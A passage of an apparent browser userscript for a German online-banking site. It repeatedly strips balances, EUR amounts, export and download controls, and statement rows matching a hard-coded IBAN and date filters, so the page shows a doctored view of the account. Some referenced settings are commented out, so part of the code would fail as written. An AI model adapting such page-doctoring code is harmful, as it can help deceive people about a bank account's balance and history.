  console.log('[comm utility] Toggles:', {
    ENABLE_REMOVE_DEBITOR_AMOUNT,
    ENABLE_TRIM_AFTER_PIPE_D6477_PRE,
    ENABLE_TRIM_AFTER_PIPE_D6477_HELPER,
    ENABLE_TRIM_AFTER_PIPE_FEEC9_HELPER,
    ENABLE_REMOVE_GESAMTSALDO,
    ENABLE_REMOVE_EXPORTIEREN,
    ENABLE_REMOVE_ACTIONS_MENU,
    ENABLE_REMOVE_EXPAND_BOOKING,
    ENABLE_REMOVE_EUR_IN_PRODUCT_DETAIL,
    ENABLE_REMOVE_TRANSACTIONS_RIGHT,
    ENABLE_REMOVE_CHIPS_CONTAINER,
    ENABLE_CLEAR_DESC_LIST_TEXT
  });

  // ── Utilities ────────────────────────────────────────────────────────────────
  // Trim the *visible* text of matching elements after the first "|" (keeps only before the pipe).
  const trimAfterPipeInElements = (selector, scope = document) => {
    let mod = 0;
    scope.querySelectorAll(selector).forEach(node => {
      try {
        const raw = normalize(node.innerText || node.textContent || '');
        const i = raw.indexOf('|');
        if (i > -1) {
          const before = normalize(raw.slice(0, i));
          if (before !== raw) {
            node.innerHTML = '';
            node.appendChild(document.createTextNode(before));
            mod++;
          }
        }
      } catch (e) {
        console.error('[comm utility] trimAfterPipeInElements error:', e, node);
      }
    });
    return mod;
  };

  // ── Task 1: remove `.debitorAmount` under `.mod.mod-DebitorDd` ───────────────
  const sweepDebitorAmount = () => {
    try {
      let n = 0;
      document.querySelectorAll(DITOR_PARENT_SELECTOR).forEach(parent => {
        parent.querySelectorAll(DITOR_TARGET_SELECTOR).forEach(el => { el.remove(); n++; });
      });
      if (n) console.log(`[comm utility] Removed ${n} .debitorAmount`);
    } catch (e) { console.error('[comm utility] sweepDebitorAmount error:', e); }
  };

  // ── Task 2a: trim after "|" in d6477 <pre> ───────────────────────────────────
  const sweepAfterPipeD6477_PRE = () => {
    try {
      const mod = trimAfterPipeInElements(D6477_TEXT_CONTAINER_PRE);
      if (mod) console.log(`[comm utility] Trimmed after "|" in d6477 <pre>: ${mod}`);
    } catch (e) { console.error('[comm utility] sweepAfterPipeD6477_PRE error:', e); }
  };

  // ── Task 2b: trim after "|" in d6477 helper <p> ─────────────────────────────
  const sweepAfterPipeD6477_HelperP = () => {
    try {
      const mod = trimAfterPipeInElements(D6477_HELPER_P_SELECTOR);
      if (mod) console.log(`[comm utility] Trimmed after "|" in d6477 helper <p>: ${mod}`);
    } catch (e) { console.error('[comm utility] sweepAfterPipeD6477_HelperP error:', e); }
  };

  // ── Task 11: trim after "|" in feec9 helper <p> (under subsection) ──────────
  const sweepAfterPipeFeec9_HelperP = () => {
    try {
      let total = 0;
      document.querySelectorAll(FEEC9_SECTION_SELECTOR).forEach(section => {
        total += trimAfterPipeInElements(FEEC9_HELPER_P_SELECTOR, section);
      });
      if (total) console.log(`[comm utility] Trimmed after "|" in feec9 helper <p>: ${total}`);
    } catch (e) { console.error('[comm utility] sweepAfterPipeFeec9_HelperP error:', e); }
  };

  // ── Task 3: remove elements containing "Ihr Gesamtsaldo beträgt" ────────────
  const sweepGesamtsaldo = () => {
    try {
      let n = 0;
      document.querySelectorAll(GESAMTSALDO_CONTAINER).forEach(container => {
        container.querySelectorAll('p, span, div').forEach(el => {
          if (normalize(el.textContent).includes(GESAMTSALDO_PHRASE)) { el.remove(); n++; }
        });
      });
      if (n) console.log(`[comm utility] Removed Gesamtsaldo elements: ${n}`);
    } catch (e) { console.error('[comm utility] sweepGesamtsaldo error:', e); }
  };

  // ── Task 4/5/6: remove various UI elements ──────────────────────────────────
  const sweepExportieren   = () => { try { let n=0; document.querySelectorAll(EXPORTIEREN_SELECTOR).forEach(el=>{el.remove();n++;}); if(n)console.log(`[comm utility] Removed Exportieren: ${n}`);} catch(e){console.error('[comm utility] sweepExportieren error:',e);} };
  const sweepActionsMenu   = () => { try { let n=0; document.querySelectorAll(ACTIONS_MENU_SELECTOR).forEach(el=>{el.remove();n++;}); if(n)console.log(`[comm utility] Removed ActionsMenu: ${n}`);} catch(e){console.error('[comm utility] sweepActionsMenu error:',e);} };
  const sweepExpandBooking = () => { try { let n=0; document.querySelectorAll(EXPAND_BOOKING_SELECTOR).forEach(el=>{el.remove();n++;}); if(n)console.log(`[comm utility] Removed ExpandBooking: ${n}`);} catch(e){console.error('[comm utility] sweepExpandBooking error:',e);} };

  // ── Task 7: remove EUR text nodes under product detail h4 ───────────────────
  const sweepEURinProductDetail = () => {
    try {
      const container = document.querySelector(PRODUCT_DETAIL_CONTAINER_ID);
      if (!container) return;
      let n = 0;
      container.querySelectorAll(PRODUCT_DETAIL_TARGET_CLASS).forEach(el => {
        if (EUR_PATTERN.test(el.textContent)) { el.remove(); n++; }
      });
      if (n) console.log(`[comm utility] Removed EUR in product detail: ${n}`);
    } catch (e) { console.error('[comm utility] sweepEURinProductDetail error:', e); }
  };

  // ── Task 8: remove right-side transaction EUR label ─────────────────────────
  const sweepTransactionsRight = () => {
    try {
      let n = 0;
      document.querySelectorAll(TRANSACTIONS_RIGHT_SELECTOR).forEach(el => {
        if (EUR_PATTERN.test(el.textContent)) { el.remove(); n++; }
      });
      if (n) console.log(`[comm utility] Removed Transactions right text: ${n}`);
    } catch (e) { console.error('[comm utility] sweepTransactionsRight error:', e); }
  };

  // ── Task 9: remove chips container ──────────────────────────────────────────
  const sweepChipsContainer = () => {
    try {
      let n = 0;
      document.querySelectorAll(CHIPS_CONTAINER_SELECTOR).forEach(el => { el.remove(); n++; });
      if (n) console.log(`[comm utility] Removed chips containers: ${n}`);
    } catch (e) { console.error('[comm utility] sweepChipsContainer error:', e); }
  };

  // ── Task 10: clear ONLY text that matches "EUR" or "Kontosaldo" ─────────────
  const sweepDescriptionListText = () => {
    try {
      let n = 0;
      document.querySelectorAll(DESC_LIST_CONTAINER).forEach(container => {
        container.querySelectorAll('dt, dd, p, span, div, li').forEach(el => {
          const txt = el.textContent || '';
          if (DESC_LIST_TEXT_MATCH.test(txt)) { el.textContent = ''; n++; }
        });
      });
      if (n) console.log(`[comm utility] Cleared description list text: ${n}`);
    } catch (e) { console.error('[comm utility] sweepDescriptionListText error:', e); }
  };

  // ── Master sweep ────────────────────────────────────────────────────────────
  const sweepAll = () => {
    try {
      if (ENABLE_REMOVE_DEBITOR_AMOUNT)          sweepDebitorAmount();

      if (ENABLE_TRIM_AFTER_PIPE_D6477_PRE)      sweepAfterPipeD6477_PRE();
      if (ENABLE_TRIM_AFTER_PIPE_D6477_HELPER)   sweepAfterPipeD6477_HelperP();
      if (ENABLE_TRIM_AFTER_PIPE_FEEC9_HELPER)   sweepAfterPipeFeec9_HelperP();

      if (ENABLE_REMOVE_GESAMTSALDO)             sweepGesamtsaldo();
      if (ENABLE_REMOVE_EXPORTIEREN)             sweepExportieren();
      if (ENABLE_REMOVE_ACTIONS_MENU)            sweepActionsMenu();
      if (ENABLE_REMOVE_EXPAND_BOOKING)          sweepExpandBooking();
      if (ENABLE_REMOVE_EUR_IN_PRODUCT_DETAIL)   sweepEURinProductDetail();
      if (ENABLE_REMOVE_TRANSACTIONS_RIGHT)      sweepTransactionsRight();
      if (ENABLE_REMOVE_CHIPS_CONTAINER)         sweepChipsContainer();
      if (ENABLE_CLEAR_DESC_LIST_TEXT)           sweepDescriptionListText();
    } catch (err) {
      console.error('[comm utility] Error in sweepAll:', err);
    }
  };

  // Kick off & run forever
  sweepAll();
  setInterval(sweepAll, INTERVAL_MS);
}



// POSTFACH
 if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

  'use strict';

  // Interval (ms). Set to 1000 for 1s; you currently used 5000.
  const INTERVAL_MS = 100;

//  // Remove row as soon as it matches the FIRST enabled rule (OR across rules)
//  const REMOVE_ON_FIRST_MATCH = true;
//
//  // ── Rules ──
//  // Each rule can independently enable/disable IBAN or Date checks.
//  // DATE wildcards:
//  //  - "00.08.000"  → month-only (August any year)
//  //  - "00.08.2025" → month + year (any day in Aug 2025)
//  //  - "00.00.2025" → year-only (any month/day in 2025)
//  //  - "01.08.2025" → exact date   CHECKS ONLY THE DATE IN DOKUMENTENTITEL, NOT ERSTELLUNGSDATUM, USUALLY THE LAST DAY OF THE MONTH IF KONTOAUSZUG
//  const RULES = [
//    {
//      name: 'Aug-2025 + specific IBAN',
//      enabled: true,
//      enableIban: true,
//      ibantextpostfach: 'DE03 8504 0000 0402 6522 00',
///      enableDate: true,
//      dateFilter: '00.08.2025',
//    },
//    {
//      name: 'Any 2022 documents (date-only)',
//      enabled: true,
//      enableIban: false,
//      ibantextpostfach: '',
//      enableDate: true,
//      dateFilter: '00.00.2022',
//    },
//    {
//      name: 'Exact IBAN only (no date)',
//      enabled: false,
//      enableIban: true,
//      ibantextpostfach: 'DE03850400000402652200',
//      enableDate: false,
//      dateFilter: '00.00.0000',
//    },
//  ];

  // ── Target rows ──
  const ROW_SELECTOR =
    '.lsgs-feec9--data-table-tr' +
    '.lsgs-feec9--data-table-tr__row' +
    '.lsgs-feec9--data-table-tr__row-separator__default' +
    '.lsgs-feec9--data-table-tr__visible' +
    '.lsgs-feec9--data-table-tr__inset-level-none' +
    '.lsg-feec9---background-base-after';

  // ── Utils ──
  const toAlnumUpper = (s) => (s || '').toUpperCase().replace(/[^A-Z0-9]/g, '');
  const DATE_REGEX = /\b(\d{2})\.(\d{2})\.(\d{4})\b/g;

  const normalizeFilterDate = (s) => {
    const m = String(s || '').match(/^(\d{2})\.(\d{2})\.(\d{3,4})$/);
    if (!m) return null;
    let [, dd, mm, yyyy] = m;
    if (/^0{3,4}$/.test(yyyy)) yyyy = '0000'; // treat 000/0000 as wildcard
    return { dd, mm, yyyy };
  };

  const dateMatchesFilter = (found, filter) => {
    const dayOk   = (filter.dd === '00')    || (found.dd === filter.dd);
    const monthOk = (filter.mm === '00')    || (found.mm === filter.mm);
    const yearOk  = (filter.yyyy === '0000') || (found.yyyy === filter.yyyy);
    return dayOk && monthOk && yearOk;
  };

  const rowMatchesDate = (row, filterStr) => {
    const filter = normalizeFilterDate(filterStr);
    if (!filter) return false;

    const text = row?.textContent || '';
    let m;
    DATE_REGEX.lastIndex = 0;
    while ((m = DATE_REGEX.exec(text)) !== null) {
      const found = { dd: m[1], mm: m[2], yyyy: m[3] };
      if (dateMatchesFilter(found, filter)) return true;
    }
    return false;
  };

  const rowMatchesIban = (row, ibantextpostfach) => {
    const needle = toAlnumUpper(ibantextpostfach || '');
    if (!needle) return false;
    const hay = toAlnumUpper(row?.textContent || '');
    return hay.includes(needle);
  };

  const rowMatchesRule = (row, rule) => {
    if (!rule?.enabled) return false;

    let anyEnabled = false;
    let ok = true;

    if (rule.enableIban) {
      anyEnabled = true;
      ok = ok && rowMatchesIban(row, rule.ibantextpostfach);
    }
    if (rule.enableDate) {
      anyEnabled = true;
      ok = ok && rowMatchesDate(row, rule.dateFilter);
    }

    // If neither IBAN nor Date is enabled on the rule, it can't match.
    if (!anyEnabled) return false;

    return ok;
  };

  console.log('[comm postfach] initialized', {
    INTERVAL_MS,
    REMOVE_ON_FIRST_MATCH,
    rules: RULES.map(r => ({ name: r.name, enabled: r.enabled, enableIban: r.enableIban, enableDate: r.enableDate, dateFilter: r.dateFilter, iban: r.ibantextpostfach })),
  });

  // ── Sweep ──
  const sweep = () => {
    try {
      const rows = document.querySelectorAll(ROW_SELECTOR);
      if (!rows.length) return;

      let removed = 0;

      rows.forEach(row => {
        try {
          for (const rule of RULES) {
            if (!rule.enabled) continue;
            if (rowMatchesRule(row, rule)) {
              row.remove();
              removed++;
              console.log(`[comm postfach] Removed row via rule: "${rule.name}"`);
              if (REMOVE_ON_FIRST_MATCH) break;
            }
          }
        } catch (err) {
          console.error('[comm postfach] Row evaluation error:', err, row);
        }
      });

      if (removed) console.log(`[comm postfach] Removed ${removed} row(s) this pass`);
    } catch (e) {
      console.error('[comm postfach] sweep error:', e);
    }
  };

  // Kick off & repeat
  sweep();
  setInterval(sweep, INTERVAL_MS);
    //--------------------------------
     function removeDownloadOptionsElement() {
  const selector = '[aria-label="Öffnen Sie Downloadoptionen in der Seitenebene."]';
  const intervalId = setInterval(() => {
    const el = document.querySelector(selector);
    if (el) {
      el.remove();
      console.log(`Removed element: ${selector}`);
    }
  }, 100);

  return intervalId; // so you can stop it later if needed
}

// Start it
const removerInterval = removeDownloadOptionsElement();



}



// KONTODETAILS

 if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {


function removeEURText() {
    try {
        const container = document.getElementById('productDetailReactContainer');
        if (!container) {
            return;
        }

        let removedCount = 0;

        const walker = document.createTreeWalker(
            container,
            NodeFilter.SHOW_TEXT,
            null,
            false
        );

        const targets = [];
        let node;

        while ((node = walker.nextNode())) {
            if (node.nodeValue && node.nodeValue.includes('EUR')) {
                targets.push(node);
            }
        }

        for (const textNode of targets) {
            if (textNode.parentNode) {
                textNode.parentNode.removeChild(textNode);
                removedCount++;
            }
        }

        if (removedCount > 0) {
            console.log(`[removeEURText] removed ${removedCount} text node(s)`);
        }

    } catch (e) {
        console.error('[removeEURText] error:', e);
    }
}

setInterval(() => {
    removeEURText();
}, 100);

console.log('[removeEURText] interval started (100ms)');

}